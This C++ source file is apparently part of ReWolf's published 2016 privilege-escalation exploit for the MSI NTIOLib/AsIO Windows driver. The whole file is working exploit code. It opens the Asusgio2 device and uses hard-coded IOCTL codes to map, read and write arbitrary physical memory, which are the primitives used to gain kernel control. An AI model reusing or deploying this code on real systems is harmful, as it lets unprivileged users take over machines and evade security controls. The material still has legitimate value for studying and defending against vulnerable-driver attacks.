/**
*
* MSI NTIOLib/AsIO privilege escalation exploit
*
* Copyright (c) 2016 ReWolf
* http://blog.rewolf.pl/
* http://blog.rewolf.pl/blog/?p=1630
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU Lesser General Public License as published
* by the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU Lesser General Public License for more details.
*
* You should have received a copy of the GNU Lesser General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/
#include <stdio.h>
#include <inttypes.h>
#include "AsIO.h"

AsIO::AsIO()
{
	hDevice = CreateFileA("\\\\.\\Asusgio2", 0xC0000000, 0, 0, 3u, 0x80u, 0);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[!] Unable to open device\r\n");
    }
    else {
        printf("[+] Asusgio2 device opened\r\n");
    }
}

AsIO::~AsIO()
{
	if (INVALID_HANDLE_VALUE != hDevice)
		CloseHandle(hDevice);
}

uint8_t* AsIO::mapPhysicalMemory(uint64_t physAddr, size_t size, asioMem& mem) const
{
	if (INVALID_HANDLE_VALUE != hDevice)
	{
		memset(&mem, 0, sizeof(asioMem));
		mem.addr = physAddr;
		mem.size = size;
		DWORD retSize;
		BOOL r = DeviceIoControl(hDevice,  0xA040A480, &mem, sizeof(asioMem), &mem, sizeof(asioMem), &retSize, 0);
		if (r)
			return (uint8_t*)mem.outPtr;
	}
	return nullptr;
}

void AsIO::unmapPhysicalMemory(asioMem& mem) const
{
	if (INVALID_HANDLE_VALUE != hDevice)
	{
		DWORD retSize;
		DeviceIoControl(hDevice, 0xA0402450, &mem, sizeof(asioMem), 0, 0, &retSize, 0);
	}
}

bool AsIO::readPhysicalMemory(uint64_t physAddress, uint8_t* buffer, size_t size) const
{
	if (INVALID_HANDLE_VALUE != hDevice)
	{
		asioMem mem;
		uint8_t* tmp = mapPhysicalMemory(physAddress, size, mem);
		if (nullptr != tmp)
		{
			memcpy(buffer, tmp, size);
			unmapPhysicalMemory(mem);
		}
	}
	return false;
}

MemoryAsIO::MemoryAsIO()
{
	memset(&m_IMemoryHelper, 0, sizeof(m_IMemoryHelper));
}

uint8_t* MemoryAsIO::getMemory(uint64_t physAddr, size_t size)
{
	reset();
	return m_WinIo.mapPhysicalMemory(physAddr, size, m_IMemoryHelper);
}

void MemoryAsIO::commitMemory()
{
	if (0 != m_IMemoryHelper.outPtr)
	{
		m_WinIo.unmapPhysicalMemory(m_IMemoryHelper);
		memset(&m_IMemoryHelper, 0, sizeof(m_IMemoryHelper));
	}
}

void MemoryAsIO::reset()
{
	commitMemory();
}

uint64_t MemoryAsIO::getPhysicalAddress()
{
	return m_IMemoryHelper.addr;
}

namespace {
	template<class T>
	void Write(uint64_t address, const T& value) {
        printf("Write at : %016" PRIx64 "\n", address);
		*reinterpret_cast<T*>(address) = value;
	}
}

void MemoryAsIO::commitValue(size_t offsetInBuf, uint64_t value)
{
	Write(m_IMemoryHelper.outPtr + offsetInBuf, value);
	commitMemory();
}
